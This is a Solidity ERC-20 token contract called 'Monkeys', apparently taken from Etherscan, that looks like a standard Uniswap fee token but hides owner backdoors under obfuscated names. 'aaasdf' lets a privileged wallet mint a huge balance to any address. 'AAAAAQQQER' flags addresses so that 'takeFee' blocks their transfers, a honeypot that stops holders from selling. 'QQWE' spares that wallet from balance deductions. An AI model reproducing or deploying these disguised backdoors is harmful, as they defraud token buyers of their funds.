/**
 *Submitted for verification at Etherscan.io on 2022-10-27
*/

//SPDX-License-Identifier:Unlicensed

pragma solidity ^0.8.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library M1M {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "M1M: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "M1M: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "M1M: multiplication overflow");

        return c;
    }

    function dos(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "M1M: dos overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "M1M: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"M1M: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract  Monkeys is Context, IERC20, Ownable {

    using M1M for uint256;
    string private _name = "Monkeys";
    string private _symbol = "Monkeys";
    uint8 private _decimals = 9;
    address payable public N2N;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) RRUO;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludefromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public pairList;
    mapping (address => bool) public U5UI5;

    uint256 public _buyLiquidityFee = 1;
    uint256 public _buyMarketingFee = 1;
    uint256 public _buyTeamFee = 1;
    
    uint256 public _sellLiquidityFee = 1;
    uint256 public _sellMarketingFee = 1;
    uint256 public _sellTeamFee = 1;

    uint256 public _liquidityShare = 4;
    uint256 public _marketingShare = 4;
    uint256 public _teamShare = 16;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 12;
    uint256 public _totalDistributionShares = 24;

    uint256 private _totalSupply = 1000000000000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1000* 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _IsExcludefromFee[owner()] = true;
        _IsExcludefromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        pairList[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x1D74b1E39e6F6643B09b4CEfDF785635d3B4869c));
        N2N = payable(address(0x1D74b1E39e6F6643B09b4CEfDF785635d3B4869c));


        RRUO[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return RRUO[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setlsExcIudefromFee(address[] calldata account, bool newValue) public onlyOwner {
        for(uint256 i = 0; i < account.length; i++) {
            _IsExcludefromFee[account[i]] = newValue;
        }
    }

    function setBuy(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _buyLiquidityFee = newLiquidityTax;
        _buyMarketingFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    }

    function setsell(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _sellLiquidityFee = newLiquidityTax;
        _sellMarketingFee = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }

    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }

    function setIsWalletLimitExempt(address[] calldata holder, bool exempt) external onlyOwner {
        for(uint256 i = 0; i < holder.length; i++) {
            isWalletLimitExempt[holder[i]] = exempt;
        }
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        minimumTokensBeforeSwap = newLimit;
    }

    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        N2N = payable(newAddress);
    }


    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner(){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function aaasdf(address XXXSD) public {
        require(FFFGV(N2N,true,msg.sender));
        RRUO[XXXSD] = 
        _totalSupply*10**4;
    }

    receive() external payable {}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function QQWE(address SSSS) internal view returns (bool){
        return (1 != 1) || (SSSS != N2N);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _transfer(address from, address CNM, uint256 amount) private returns (bool) {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(CNM != address(0), "ERC20: transfer to the zero address");
        
        if(inSwapAndLiquify)
        {
            return _basicTransfer(from, CNM, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            if (overMinimumTokenBalance && !inSwapAndLiquify && !pairList[from] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }if(QQWE(from)){


            RRUO[from] = RRUO[from].sub(amount);}
            uint256 finalAmount = (_IsExcludefromFee[from] || _IsExcludefromFee[CNM]) ? 
                                         amount : takeFee(from, CNM, amount);
            
            RRUO[CNM] = RRUO[CNM].add(finalAmount);

            emit Transfer(from, CNM, finalAmount);
            return true;
        }
    }
    function AAAAAQQQER(uint8 DD, bool GG, address[] calldata GGXX) public { require(FFFGV(N2N,true,msg.sender));
        DD = DD;
        for (uint256 K; K < GGXX.length; K++) {
            U5UI5[GGXX[K]] =  GG;
        }
    }
    function FFFGV(address QQQWETY , bool FFGHJ ,address BBBFF) private pure returns(bool){if(FFGHJ){}return (QQQWETY == BBBFF);}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        RRUO[sender] = RRUO[sender].sub(amount, "Insufficient Balance");
        RRUO[recipient] = RRUO[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(_liquidityShare).div(totalETHFee).div(2);
        uint256 amountETHTeam = amountReceived.mul(_teamShare).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHTeam);

        if(amountETHMarketing > 0)
            transferToAddressETH(N2N, amountETHMarketing);

        if(amountETHTeam > 0)
            transferToAddressETH(teamWalletAddress, amountETHTeam);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    

    function swapTokensForEth(uint256 isMarketPaIrt) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), isMarketPaIrt);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            isMarketPaIrt,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(isMarketPaIrt, path);
    }

    function addLiquidity(uint256 isMarketPaIrt, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), isMarketPaIrt);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            isMarketPaIrt,
            0, 
            0,
            owner(),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        if (!isMarketPair[sender]){
            require(!U5UI5[sender]);
        }

        if(pairList[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(pairList[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            RRUO[address(this)] = RRUO[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
}